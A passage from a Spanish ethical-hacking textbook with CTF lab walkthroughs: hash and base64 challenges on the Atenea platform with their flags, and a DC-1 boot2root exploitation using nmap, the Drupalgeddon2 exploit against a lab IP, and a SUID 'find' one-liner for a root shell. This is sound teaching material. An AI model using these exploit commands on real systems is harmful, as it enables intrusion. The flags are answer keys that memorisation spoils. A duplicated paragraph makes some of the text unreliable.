- **No cON Name** (https://www.noconname.org). Una de las conferencias más antiguas de España, surgió en 1999 en las Islas Baleares como asociación sin ánimo de lucro.
- **Congreso c1b3rWall** (https://c1b3rwall.policia.es/congreso). Su primera edición tuvo lugar en 2019 y, tras el parón obligado por la pandemia, volvió a celebrarse en 2022. Se lleva a cabo en la sede de la Escuela Nacional de Policía en Ávila a finales de junio.
- **Jornadas STIC del CCN-CERT** (https://www.ccn-cert.cni.es/comunicacion-eventos/jornadas-stic-ccn-cert.html). Jornadas organizadas por el Centro Criptológico Nacional desde 2007, que reúnen a responsables de seguridad de las administraciones públicas, empresas y expertos en ciberseguridad. En la web de las diferentes ediciones se pueden encontrar los vídeos y materiales de las charlas que se han llevado a cabo.

## Laboratorio de prácticas

En esta unidad se plantean dos laboratorios de prácticas cuyo objetivo es iniciar al lector en el uso de retos de captura de bandera (CTF) como forma de aprender, mantenerse actualizado y ampliar conocimientos, cualidades muy necesarias para desempeñar la labor de un hacker ético.

Para el primer laboratorio se usará la plataforma Atenea, perteneciente al Centro Criptológico Nacional (CCN-CERT), que dispone de una categoría de retos de iniciación. Se explicará la resolución de los primeros cuatro retos. En el segundo laboratorio se realizará el proceso completo de test de intrusión siguiendo las fases de reconocimiento, enumeración, explotación y posexplotación estudiadas en la unidad. Se hará sobre una máquina vulnerable disponible para su descarga desde la plataforma VulnHub.

### Mi primer CTF. Retos de la plataforma Atenea

Este laboratorio es una introducción a la resolución de retos CTF. Para ello, se ha elegido la plataforma Atenea (https://atenea.ccn-cert.cni.es), que dispone de retos en castellano y distintas categorías de retos básicos de iniciación y otros retos más avanzados. Una vez realizado el registro en la web, hay que dirigirse a la sección Retos y en ella a la pestaña Básica. Aparecerá un listado de retos desplegables que estarán accesibles conforme se vaya avanzando y resolviendo todos los anteriores (Figura 1.9).

La solución a los retos se envía a través de un campo de texto en el interior de cada reto. Deben leerse bien las instrucciones y verificar que se está introduciendo la flag de forma correcta, ya que solo se dispone de 3 intentos de envío. Si la flag es correcta, se recibirán los puntos que se tengan asignados en ese momento y se marcará como resuelto con un color de fondo verde.

Los siguientes apartados sirven de guia para la resolución de los cuatro prime-
ros retos de esta categoria. Se anima al lector a que continue y complete los re-
tos restantes.

![image-20241016140319436](./img/fig1.9.png)

Figura 1.9. Retos de la categoría Básica en la plataforma Atenea.

Los siguientes apartados sirven de guía para la resolución de los cuatro primeros retos de esta categoría. Se anima al lector a que continúe y complete los retos restantes.

![image-20241016140319436](./img/fig1.9.png)

**Figura 1.9. Retos de la categoría Básica en la plataforma Atenea.**

### Hash 1

El primer reto introduce las funciones de resumen o funciones hash, un tipo de función que se emplea en criptografía para el almacenamiento de contraseñas (Apartado 5.2.2). El enunciado del reto es el siguiente:

> Reto
>
> **La contraseña para superar este reto es** `LearnTheHashFunction`.
>
> Tendrás que calcular su hash md5 y ponerla en el formato de la plataforma, esto es: `flag{md5}`.
>
> Por ejemplo: `flag{378041508fcb2574e1724f8917369be9}`.

Por tanto, hay que calcular el hash md5 de la cadena indicada y ponerla en el formato en el que se introducen las flags en Atenea, que siempre es de la misma forma: `flag{md5}`.

Para calcular este valor se emplea la línea de comandos:

```bash
$ echo -n LearnTheHashFunction | md5sum
b2f2d6b27b264d83fe1abe0169b7613e -
```

 La opción `-n` elimina el salto de línea que añade la función `echo` por defecto. De no usarlo, el hash generado sería distinto y, por tanto, erróneo. De esta forma, se pasa la cadena mediante una tubería a la función `md5sum` disponible en la línea de comandos de Linux. También se puede utilizar el sitio web CyberChef (https://gchq.github.io/CyberChef/) para hallar el mismo resultado.

**Solución**: `flag{b2f2d6b27b264d83fe1abe0169b7613e}`

### Hash 2

Este segundo reto presenta una nueva función hash, sha256. El enunciado del reto es el siguiente:

> Reto
>
> **La contraseña para superar este reto es** `ThisIsAMoreSecureHashFunction`.
>
> Tendrás que calcular su hash sha256 y posteriormente calcular su md5 para poder poner la solución en el formato de la plataforma, esto es: `flag{md5}`.

Para calcularlo, hay que seguir el mismo procedimiento del reto anterior, utilizando además el comando `sha256sum`:

```bash
$ echo -n ThisIsAMoreSecureHashFunction | sha256sum
d191ce0a9d8061acb609be613d0abdecd13d93946fa3e8aa3c0c40a2102502ff -

$ echo -n d191ce0a9d8061acb609be613d0abdecd13d93946fa3e8aa3c0c40a2102502ff | md5sum
dd321a22229e0bbb5f8271e370b61eb0 -
```

Nótese que la salida de los comandos `sha256sum` y `md5sum` añaden espacios, un carácter `-` y un salto de línea al final del hash, por lo que no es posible usar una tubería entre ellos directamente. Podría utilizarse de manera intermedia el comando `awk` para extraer de la salida solo la cadena correspondiente del hash `sha256sum`:

```bash
$ echo -n ThisIsAMoreSecureHashFunction | sha256sum | awk '{printf $1}' | md5sum
dd321a22229e0bbb5f8271e370b61eb0
```

En el interior de `awk` se utiliza la función `printf` en lugar de `print` para evitar que se introduzca un salto de línea.

**Solución**: `flag{dd321a22229e0bbb5f8271e370b61eb0}`

### Hash 3

En este reto se explica que las funciones hash son de un único sentido, es decir, a partir del hash calculado no se puede obtener la cadena de texto original. Al menos esta es la teoría, ya que se pueden realizar ataques de fuerza bruta o por diccionario para tratar de hallar la cadena que genera ese hash. El enunciado de este reto es el siguiente:

> Reto
>
> **Para superar este reto deberás calcular la cadena de texto cuyo hash md5 se corresponde con el siguiente**: `54f662a095fa3d5fbbdaac72d176701b`.
>
> Una vez obtenida, deberás poner esa cadena de texto en mayúsculas y calcular su hash md5 para poder enviar la solución siguiendo el formato de la plataforma: `flag{md5}`.

Debe recuperarse la cadena que corresponde con ese hash, que tiene apariencia de haber sido generado con la función md5 por su longitud (32 caracteres hexadecimales). En los retos aparecen referencias que pueden servir de ayuda; en este se menciona CrackStation, una web que permite comprobar si un determinado hash ha sido ya calculado (Figura 1.10).

![image-20241016142227387](./img/fig1.10.png)

Figura 1.10. Búsqueda de la cadena de texto que genera un hash.(https://crackstation.net/).

Tal y como indican las instrucciones, debe pasarse la cadena a mayúsculas y obtener su hash md5.

```bash
$ echo MASTEROFPUPPETS | md5sum
f395885371dd0ad12136d8a733e05e22
```

También se dispone del comando `tr` que se usa para transformar cadenas de caracteres. El comando en una línea sería el siguiente:

```bash
$ echo -n masterofpuppets | tr a-z A-Z | md5sum
f395885371dd0ad12136d8a733e05e22 -
```

**Solución**: `flag{f395885371dd0ad12136d8a733e05e22}`

---

### Base64

Este reto es una introducción a la codificación de caracteres y a la diferencia entre cifrar y codificar. Una de las codificaciones más frecuentes es base64, que se emplea, por ejemplo, para transferir ficheros binarios a través del protocolo HTTP, correos electrónicos, etcétera.

El enunciado del reto es el siguiente:

> Reto
>
> **Para superar este reto tendrás que descodificar el fichero adjunto y poner la contraseña en el formato de la plataforma, esto es: `flag{md5}`.**

El contenido del fichero descargado es el siguiente:

```
UmVjdWVyZGEgcXV1LIGN1YWS5kbyBjb2RpZm1jYXMgYWxnbyB1biBiYXNINjQgTk8gbG8gZXNOw6FzIGNpZnJhbmRvLCBzaW5vIHF1ZSBzaW1wbGVtZW50ZSBsbyBlc3TDoXMgY29kaWZpY2FuZG8uDQoNCkxhIGNvbnRyYXNlw7FhIHBhemEgce3VwZXJhciBlc3R1IHJ1dG8gZXM6IHJ1Y3V1cemRhcXV1YmFzZTYOTK91c2NpZnJhcg0KCg==
```

Se puede emplear el comando `base64` con la opción `-d` o `--decode` para decodificar esta cadena:

```bash
$ base64 -d base64.txt
Recuerda que cuando codificas algo en base64 NO lo estás cifrando, sino que simplemente lo estás codificando.

La contraseña para superar este reto es: **recuerdaquebase64NOescifrar**.
```

Se obtiene la flag de la manera habitual:

```bash
$ echo -n recuerdaquebase64NOescifrar | md5sum
cf9df460535b4ec175a464c6c120d3fe -
```

**Solución**: `flag{cf9df460535b4ec175a464c6c120d3fe}`

### Mi primera máquina vulnerable (boot2root): DC-1

La idea de este segundo laboratorio de esta primera unidad es continuar introduciendo al lector en la resolución de diferentes retos, ya que es una manera excepcional de aprender. Se hará hackeando una máquina que tiene diversas vulnerabilidades. Este tipo de retos llamados boot2root tienen dos objetivos. En primer lugar, lograr acceso a la máquina y obtener la primera flag de usuario, y en segundo lugar escalar privilegios y obtener la segunda flag de root o administrador.

Para ello se utilizará una máquina sencilla disponible en VulnHub: DC-1 ([Máquina en VulnHub: DC-1](https://www.vulnhub.com/entry/de-1,292/)). Esta máquina fue publicada en 2019 y presenta un sitio web construido con el CMS Drupal.

Sin más dilación, hay que descargar la OVA y exportarla en VirtualBox. Emplearemos nuestra máquina atacante Kali Linux para llevar a cabo el test de intrusión. La configuración de red de las máquinas en VirtualBox será de red NAT.

### Escaneo y enumeración

El primer paso tras arrancar la máquina es averiguar la dirección IP que tiene asignada. Puesto que estamos en el mismo segmento de red se puede emplear el comando netdiscover que utiliza el protocolo ARP para descubrir los equipos activos en una red local:

```bash
$ sudo netdiscover -r 10.0.1.0/24
```

La Figura 1.11 muestra el resultado de este escaneo. Las tres primeras direcciones IP corresponden a VirtualBox, por lo que a la máquina objetivo le corresponde la dirección 10.0.1.12.

**Figura 1.11. Dirección IP de la máquina objetivo DC-1 descubierta con netdiscover.**

Una vez fijado el objetivo, se puede realizar un ping para comprobar que está activa. El siguiente paso es comprobar los puertos abiertos y enumerar los servicios que se están ejecutando en cada uno de ellos. Para ello se utiliza el comando `nmap` con una serie de opciones de enumeración (Apartado 3.3).

```bash
$ nmap -sC -sV -oA dcl 10.0.1.12
```

```txt
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
ssh-hostkey:
1024 c4d659e6774c227a961660678b42488f (DSA)
2048 1182fe534edc5b327f446482757dd0a0 (RSA)
256 3daa985c87afea84b823688db9055fd8 (ECDSA)

80/tcp   open  http     Apache httpd 2.2.22 ((Debian))
_http-generator: Drupal 7 (http://drupal.org)
_http-title: Welcome to Drupal Site | Drupal Site
_http-server-header: Apache/2.2.22 (Debian)
http-robots.txt: 36 disallowed entries (15 shown)
/includes/ /misc/ /modules/ /profiles/ /scripts/ /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
/INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt /LICENSE.txt /MAINTAINERS.txt

111/tcp  open  rpcbind  2-4 (RPC #100000)
```

La salida muestra tres puertos abiertos. El que resulta más interesante es el puerto 80 donde se ejecuta el CMS Drupal en su versión 7. Al visitar la web se ve un formulario de login sin ningún enlace más a simple vista. Las credenciales predeterminadas no funcionan, por lo que se podría comenzar a realizar fuzzing web (Apartado 3.4.3). También se podría usar una herramienta específica de enumeración para Drupal como `droopescan` o `drupwn` para tratar de averiguar los plugins y temas instalados, la versión específica, las cuentas de usuario, etc. Nos saltaremos estos pasos.

Durante la labor de pentesting es importante tener en cuenta el periodo temporal en el que se lleva a cabo y conocer las vulnerabilidades más graves recientemente publicadas. La máquina se publicó en 2019 y en aquel momento la versión 7 de Drupal puede que estuviera desactualizada, por lo que se puede ver si existe algún exploit para esta. El comando `searchsploit` permite realizar esta búsqueda de forma sencilla.

```bash
$ searchsploit drupal 7
```

La salida del comando es extensa. Destacan una serie de vulnerabilidades graves llamadas Drupalgeddon que permiten la ejecución de código remoto (RCE). Dadas las versiones y el espacio temporal, se sabe que el CMS del objetivo podría ser vulnerable a Drupalgeddon 2 (CVE-2018-7600), que afectó a las versiones 6, las anteriores a la 7.58, y a diferentes ramas de la versión 8. Se empleará un script en Python desarrollado por kahliya ([CVE-2018-7600-drupalgeddon2-scanner](https://github.com/kahliya/CVE-2018-7600-drupalgeddon2-scanner)) para chequear si realmente el CMS del objetivo es vulnerable.

La Figura 1.12 muestra la ejecución del script confirmando que el objetivo es vulnerable. Por tanto, se puede pasar a la fase de explotación.







**Figura 1.12. Confirmación de la vulnerabilidad CVE-2018-7600 en el CMS Drupal del objetivo.**

### Explotación

Existen diversos exploits que se pueden utilizar para aprovechar la vulnerabilidad encontrada. Algunos de ellos, que aparecen en la salida del comando `searchsploit`, forman parte del framework Metasploit. El funcionamiento de Metasploit se explica en el Apartado 5.4, por lo que dejamos al lector revisarlo y que tras ello vuelva aquí y trate de explotar esta máquina con Metasploit.

Encontrar un exploit adecuado puede requerir diversas pruebas, pero es fácil encontrarlos a través de búsquedas en Google. Para explotar esta vulnerabilidad, se ha elegido un exploit escrito en Python por lorddemon ([drupalgeddon2](https://github.com/lorddemon/drupalgeddon2)).

El script es antiguo y está escrito en Python 2; por suerte, en Kali todavía hay soporte y está correctamente configurado para poder ejecutarlo sin problemas.

```bash
$ python2 drupalgeddon2-exploit.py -h http://10.0.1.12 -c 'whoami'
www-data
```

Como se ha comprobado, este script permite ejecutar comandos, por lo que se pueden realizar acciones de enumeración local (Apartado 6.3.1), pero antes de eso es recomendable obtener una shell reversa estable en nuestra máquina. La Figura 1.13 muestra cómo se ha logrado. En la parte inferior se ejecuta un listener con netcat y en la parte superior se ejecuta el exploit al que se le pasa el comando que inicia la shell reversa. Tras ejecutarlo, se inicia la conexión de la máquina explotada en nuestro listener. En la imagen se muestra la ejecución del comando `id` en DC-1 desde nuestra máquina Kali. En el Apartado 5.6.1 se explica en profundidad cómo se lleva a cabo este proceso.









**Figura 1.13. Obtención de una shell reversa con netcat en la máquina DC-1.**

Buscando la flag de usuario, encontraremos el fichero `flag1.txt` en `/var/www` y otra en `/home/flag4/flag4.txt`.

### Posexplotación

El último paso que nos queda es tratar de escalar privilegios y convertirnos en root. Existen muchas vías para hacerlo, y la correcta dependerá de la configuración de la máquina objetivo. Una de las opciones que primero debe comprobarse son los binarios SUID que hay en el sistema (Apartado 6.3.4) con el comando `find`.

```bash
www-data@DC-1:/var/www$ find / -perm -u=s 2>/dev/null
/usr/bin/gpasswd
/usr/bin/procmail
/usr/bin/find
/usr/sbin/exim4
/usr/lib/pt_chown
```

Vemos que en esta lista está el comando `find`. Al consultar la página de [GTFOBins](https://gtfobins.github.io), se ve que es posible aprovechar este binario para escalar privilegios y obtener una shell como root.

```bash
$ find . -exec /bin/bash -p \; -quit
```

```bash
bash-4.2# cd /root/
bash-4.2# ls
thefinalflag.txt
```

De este modo podemos navegar al directorio `/root` donde se sitúa habitualmente la última flag de la máquina. Por tanto, hemos finalizado el reto de explotación boot2root.

 

# Actividades finales 

## DE COMPROBACIÓN

1.1. ¿Cuál es el origen de la palabra hacker y su significado?

1.2. Indica, en cada caso, qué principio de la seguridad de la información se ha visto afectado.

a) Un empleado descontento ha sacado información confidencial de la empresa en un pendrive para venderla en la dark web.

b) Un apagón que ha sucedido durante las horas de trabajo de una empresa ha impedido el desarrollo normal de la actividad.

c) Un intruso ha logrado acceder a los sistemas informáticos y desviar los pagos de algunas facturas a una cuenta de su propiedad.

1.3. ¿Qué amenazas a la seguridad son relevantes para el hacking ético?

1.4. Explica las diferencias entre los siguientes términos:

a) Hacker vs cracker.

b) White hat vs black hat.

c) Lamer vs wannabes.

d) Hacktivist vs state-sponsored.

1.5. ¿Qué tipo de ataque busca vulnerar los sistemas de un tercero para lograr comprometer la seguridad de un objetivo que confía en ese tercero?

1.6. Indica a qué fases de un test de intrusión se corresponden las siguientes actuaciones:

a) Se ejecuta un exploit que aprovecha una vulnerabilidad en una aplicación web con una versión desactualizada, logrando el acceso al sistema de la víctima.

b) Se busca información en Internet de los empleados de la empresa objetivo, sus relaciones, redes sociales, etcétera.

c) Se presentan los resultados del test de intrusión al equipo del departamento de IT.

d) Se realiza un movimiento lateral en la red de la corporación de la víctima, accediendo a otra máquina donde se encuentra el servidor de bases de datos e información importante.

e) Por medio de una herramienta que realiza un escáner de vulnerabilidades, se descubre que hay un CMS con una versión antigua vulnerable.

1.7. Responde a las siguientes cuestiones relacionadas con las metodologías de pentesting:

a) ¿Qué metodología incluye entre sus fases la elaboración de un modelo de amenazas?

b) ¿Qué metodología utiliza el RAV para medir la superficie de exposición?

c) ¿Qué nombre recibe el documento elaborado por el OWASP para realizar las auditorías de aplicaciones para móviles?

d) ¿Qué metodología incluye cuatro fases de ejecución, entre las que se encuentra la fase de encuesta?

e) ¿Qué metodología se emplea para la auditoría de tarjetas de crédito?

f) ¿Qué metodología incluye una serie de canales sobre los que se debe probar la seguridad de la organización, como el canal de seguridad humana?

1.8. Explica las diferencias entre pentesting y red teaming.

1.9. Según la pirámide BAD propuesta por Daniel Miessler, ¿qué equipos se incluyen entre los defensores?

1.10. ¿Cómo se denominan los retos en los que hay que encontrar un secreto oculto?

## DE APLICACIÓN

1.11. Para desempeñar nuestra labor de hacker ético de forma profesional debemos mantenernos informados de las brechas de seguridad y vulnerabilidades que afectan al software y al hardware, puesto que esas mismas vulnerabilidades nos las encontraremos, tarde o temprano, en alguna de nuestras auditorías. Investiga sobre vulnerabilidades graves que hayan aparecido recientemente (CVSS superior a 7) y muestra los siguientes datos:

- Nombre de la vulnerabilidad (si se ha bautizado), CVE y CVSS.
- Breve descripción de en qué consiste, a qué software afecta (versiones) y con qué categoría de CWE se corresponde.
- Atribución del descubrimiento, añadiendo la referencia original a la publicación correspondiente si es posible, y si esa persona u organización tiene otros descubrimientos interesantes.

1.12. Una de las labores del hacker ético, una vez que ha terminado el test de intrusión, es elaborar y presentar un informe al cliente donde se recogen las vulnerabilidades y los problemas de seguridad encontrados y las recomendaciones para solucionar o mitigar esas vulnerabilidades. Para conocer las características que tienen estos informes, puedes analizar alguno de los informes profesionales publicados en Internet. Trata de responder a algunas preguntas, como:

- ¿Qué aspecto tiene el informe en cuanto a estilo, redacción, estructura y extensión?
- ¿Qué metodología de pentesting se ha aplicado?
- ¿Cómo se identifican y clasifican las vulnerabilidades?
- ¿Se ofrecen mitigaciones a los problemas de seguridad encontrados?

Escribe tus propias conclusiones acerca de cómo debe elaborarse y las características que debe tener un informe que tuvieras que escribir.

1.13. Este ejercicio se puede realizar en grupos: un grupo asume el rol de la empresa de ciberseguridad y el otro el rol de la empresa que desea contratar un test de intrusión. El segundo grupo debe plantear un supuesto sobre cómo es su empresa, qué estructura tiene, los sistemas con los que trabaja, etcétera.

- Elabora un cuestionario previo que ayude a determinar el tipo y alcance de la auditoría que se realizará, así como los equipos y servicios que se auditarán.
- Tras la entrevista, elabora una tabla con los activos internos y externos de la organización, y otra información necesaria para elaborar el acuerdo.
- Elabora un acuerdo de auditoría, donde se recogerán los activos implicados en ella, el tipo de auditoría que se realizará sobre cada activo y la duración del mismo.

- Recursos para la actividad: 
  - [Modelo 1](https://itsecurity.uiowa.edu/sites/itsecurity.uiowa.edu/files/wysiwyg_uploads/penetrationtestingagreement.pdf)
  - [Modelo 2](https://www.roboshadow.com/cyber-scan/cyber-scan-book-now/penetration-test-agreement/)
  - [Modelo 3](http://www.counterhack.net/permission_memo.html)
  - [Modelo 4](https://redteam.guide/docs/checklists/roe-planning)

1.14. Realiza todos los retos básicos de la plataforma Atenea continuando con el laboratorio de la unidad.

1.15. Realiza tu segunda máquina boot2root con el reto Simple CTF de TryHackMe ([Reto CTF en TryHackMe - SimpleCTF](https://tryhackme.com/room/easyctf)). En este reto se explota una vulnerabilidad del CMS instalado en la máquina que permite recuperar y crackear los hashes de las credenciales SSH de los usuarios. Una vez en el sistema, la escalada de privilegios se lleva a cabo con `sudo`.

## DE AMPLIACIÓN

1.16. Haz una lista de empresas u organismos que hayan sufrido ataques cibernéticos y trata de encontrar información técnica al respecto sobre cómo se realizaron.

1.17. En la plataforma Atenea dispones de otras categorías de retos básicos: red, web, correo electrónico, ransomware y teléfono móvil. Completa alguno o varios de ellos.

1.18. Realiza la máquina Bandit, de los Wargames de OverTheWire ([OverTheWire - Bandit](https://overthewire.org/wargames/bandit/)). Esta máquina está enfocada a principiantes y guía en el uso de la interfaz de comandos, por lo que sirve como entrenamiento y aprendizaje.

1.19. Una buena práctica de un hacker ético y que puede ser útil en algunas actividades es disponer de un sistema funcional en un dispositivo externo USB, que permita almacenar información que, por seguridad, debería estar cifrada. Para esto, puedes seguir el manual de Offensive Security para instalar Kali Linux en un USB con cifrado y persistencia ([Instrucciones para la instalación de Kali Linux en un USB con cifrado y persistencia](https://www.kali.org/docs/usb/)).

1.20. El uso eficiente de la terminal de comandos es una cualidad muy recomendable. La herramienta `tmux` (terminal multiplexer) permite trabajar con diferentes sesiones, ventanas y paneles empleando combinaciones de teclas. Es recomendable aprender cómo se maneja. Puedes ver los vídeos de Ippsec y HackerSploit donde explican su funcionamiento básico. Además, en la web de Paraninfo encontrarás un fichero de configuración para tmux (.tmux.conf) que puedes descargar y utilizar.

- Recursos:
  - [Ippsec - Introduction to tmux](https://youtu.be/Lqehvpe_djs)
  - [HackerSploit - Complete tmux tutorial](https://youtu.be/YI7NFenTglo)

1.21 Explora los laboratorios gratuitos de TryHackMe (laboratorios en Paraninfo) y realiza alguno que esté relacionado con los contenidos de esta unidad.
